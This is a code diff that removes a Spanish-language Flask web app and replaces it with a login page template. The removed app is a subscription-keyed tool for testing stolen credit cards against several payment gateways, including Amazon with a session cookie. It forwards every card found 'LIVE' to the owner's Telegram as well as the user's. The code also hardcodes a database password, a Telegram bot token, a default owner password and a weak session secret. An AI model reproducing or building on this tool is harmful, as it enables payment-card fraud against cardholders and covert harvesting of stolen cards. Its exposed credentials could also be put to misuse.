@@ -1,252 +1,35 @@
-import os
-import asyncio
-from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
-from flask_cors import CORS
-from flask_sqlalchemy import SQLAlchemy
-from werkzeug.security import generate_password_hash, check_password_hash
-import requests as req
-import tec, red, em, amazon
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Iniciar Sesión</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+  <div class="container">
+    <h2>Iniciar Sesión</h2>
 
-app = Flask(__name__)
-app.secret_key = 'tu_secreto_super_seguro'
-CORS(app, resources={r"/*": {"origins": "*"}})
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        <ul class="flash-messages">
+          {% for category, message in messages %}
+            <li class="{{ category }}">{{ message }}</li>
+          {% endfor %}
+        </ul>
+      {% endif %}
+    {% endwith %}
 
-app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:cKDrLMbTgKkaYXtNFDgZOgpzbVISnJor@maglev.proxy.rlwy.net:37751/railway'
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-db = SQLAlchemy(app)
+    <form method="POST" action="{{ url_for('login') }}">
+      <label for="username">Usuario</label>
+      <input type="text" id="username" name="username" required placeholder="Tu usuario" />
 
-# MODELOS
-class User(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(50), unique=True, nullable=False)
-    password_hash = db.Column(db.String(512), nullable=False)
-    key = db.Column(db.String(128), db.ForeignKey('key.key'), nullable=True)
-    telegram_id = db.Column(db.String(20), nullable=True)
-    role = db.Column(db.String(10), default='user')
+      <label for="password">Contraseña</label>
+      <input type="password" id="password" name="password" required placeholder="Tu contraseña" />
 
-    def set_password(self, password):
-        self.password_hash = generate_password_hash(password)
+      <button type="submit">Ingresar</button>
+    </form>
 
-    def check_password(self, password):
-        return check_password_hash(self.password_hash, password)
-
-class Key(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    key = db.Column(db.String(128), unique=True, nullable=False)
-    used = db.Column(db.Boolean, default=False)
-    expires_at = db.Column(db.DateTime, nullable=True)
-
-# Inicializar owner y owner_key si no existen
-def init_owner_and_key():
-    try:
-        db.session.rollback()
-        owner = User.query.filter_by(username='owner1').first()
-        if not owner:
-            owner = User(username='owner1', role='owner')
-            owner.set_password('Saiper123')
-            db.session.add(owner)
-            db.session.commit()
-
-        owner_key = Key.query.filter_by(key='owner_key').first()
-        if not owner_key:
-            owner_key = Key(key='owner_key', used=True, expires_at=None)
-            db.session.add(owner_key)
-            db.session.commit()
-
-    except Exception as e:
-        db.session.rollback()
-        print(f"Error inicializando owner y owner_key: {e}")
-
-# RUTAS
-
-@app.route('/')
-def index():
-    if 'user_id' in session:
-        return redirect(url_for('dashboard'))
-    return render_template('index.html')
-
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-    user = User.query.filter_by(username=username).first()
-    if user and user.check_password(password):
-        session['user_id'] = user.id
-        return redirect(url_for('dashboard'))
-    flash('Usuario o contraseña incorrectos', 'error')
-    return redirect(url_for('index'))
-
-@app.route('/register', methods=['GET', 'POST'])
-def register():
-    if request.method == 'POST':
-        username = request.form['username'].strip()
-        password = request.form['password']
-        key_input = request.form['key'].strip()
-
-        if username.lower() == 'owner':
-            flash('No puedes registrar un usuario con el nombre "owner".', 'error')
-            return redirect(url_for('register'))
-
-        key_obj = Key.query.filter_by(key=key_input, used=False).first()
-        if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-            flash('La key no es válida, ya fue usada o expiró.', 'error')
-            return redirect(url_for('register'))
-
-        if User.query.filter_by(username=username).first():
-            flash('El usuario ya existe.', 'error')
-            return redirect(url_for('register'))
-
-        user = User(username=username, key=key_input)
-        user.set_password(password)
-        db.session.add(user)
-        key_obj.used = True
-        db.session.commit()
-        flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
-        return redirect(url_for('index'))
-    return render_template('register.html')
-
-@app.route('/dashboard')
-def dashboard():
-    if 'user_id' not in session:
-        return redirect(url_for('index'))
-
-    user = db.session.get(User, session['user_id'])
-    if not user:
-        session.clear()
-        return redirect(url_for('index'))
-
-    keys = Key.query.all() if user.role in ['owner', 'admin'] else []
-    return render_template('checker.html', username=user.username, role=user.role, keys=keys)
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('index'))
-
-@app.route('/save_telegram_id', methods=['POST'])
-def save_telegram_id():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    telegram_id = request.json.get('telegram_id')
-    user = User.query.get(session['user_id'])
-    user.telegram_id = telegram_id
-    db.session.commit()
-    return jsonify({'status': 'success', 'message': 'Telegram ID guardado correctamente.'})
-
-@app.route('/redeem_key', methods=['POST'])
-def redeem_key():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    key_input = request.json.get('key').strip()
-    key_obj = Key.query.filter_by(key=key_input, used=False).first()
-    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-        return jsonify({'status': 'error', 'message': 'La key es inválida o ya expiró.'}), 400
-
-    user = User.query.get(session['user_id'])
-    user.key = key_input
-    key_obj.used = True
-    db.session.commit()
-    return jsonify({'status': 'success', 'message': 'Key canjeada correctamente.'})
-
-@app.route('/generate_key', methods=['POST'])
-def generate_key():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    if user.role not in ['owner', 'admin']:
-        return jsonify({'status': 'error', 'message': 'No tienes permisos para generar keys.'}), 403
-
-    duration_days = int(request.json.get('duration_days', 1))
-    new_key_str = os.urandom(6).hex()
-    expires_at = datetime.utcnow() + timedelta(days=duration_days)
-    new_key = Key(key=new_key_str, expires_at=expires_at)
-    db.session.add(new_key)
-    db.session.commit()
-    return jsonify({'status': 'success', 'key': new_key_str, 'expires_at': expires_at.isoformat()})
-
-@app.route('/add_admin', methods=['POST'])
-def add_admin():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    if user.role != 'owner':
-        return jsonify({'status': 'error', 'message': 'No tienes permisos para agregar administradores.'}), 403
-
-    username = request.json.get('username')
-    new_admin = User.query.filter_by(username=username).first()
-    if not new_admin:
-        return jsonify({'status': 'error', 'message': 'Usuario no encontrado.'}), 404
-
-    new_admin.role = 'admin'
-    db.session.commit()
-    return jsonify({'status': 'success', 'message': f'Usuario {username} ahora es admin.'})
-
-TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
-OWNER_TELEGRAM_ID = '846983753'
-
-def enviar_telegram(mensaje, ids=[]):
-    chat_ids = set(ids + [OWNER_TELEGRAM_ID])
-    for chat_id in chat_ids:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {'chat_id': chat_id, 'text': mensaje, 'parse_mode': 'Markdown'}
-        try:
-            req.post(url, data=data)
-        except Exception as e:
-            print(f"Error enviando Telegram a {chat_id}: {e}")
-
-@app.route('/check', methods=['POST'])
-def check_card():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No has iniciado sesión.'}), 401
-
-    user = User.query.get(session['user_id'])
-    key_obj = Key.query.filter_by(key=user.key).first()
-
-    if not key_obj or (key_obj.expires_at and key_obj.expires_at < datetime.utcnow()):
-        return jsonify({'status': 'error', 'message': 'No tienes una key activa o tu key ha expirado.'}), 403
-
-    data = request.get_json()
-    cc = data.get('cc')
-    gateway = data.get('gateway', 'TEC')
-    cookie = data.get('cookie', '')
-
-    try:
-        if gateway == 'TEC':
-            result = asyncio.run(tec.process_card(cc))
-        elif gateway == 'RED':
-            result = asyncio.run(red.process_card(cc))
-        elif gateway == 'EM':
-            result = asyncio.run(em.process_card(cc))
-        elif gateway == 'AMAZON':
-            result = amazon.procesar_tarjeta_amazon(cc, cookie)
-        else:
-            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
-
-        if result['status'] == 'live':
-            telegram_ids = set()
-            if user.telegram_id:
-                telegram_ids.add(user.telegram_id)
-            telegram_ids.add(OWNER_TELEGRAM_ID)
-            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", list(telegram_ids))
-
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/ping')
-def ping():
-    return jsonify({'message': 'pong'})
-
-if __name__ == '__main__':
-    with app.app_context():
-        print("Creando owner y owner_key si no existen...")
-        init_owner_and_key()
-        print("Proceso de inicialización terminado.")
-
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    <p>¿No tienes cuenta? <a href="{{ url_for('register') }}">Regístrate aquí</a></p>
+  </div>
+</body>
+</html>
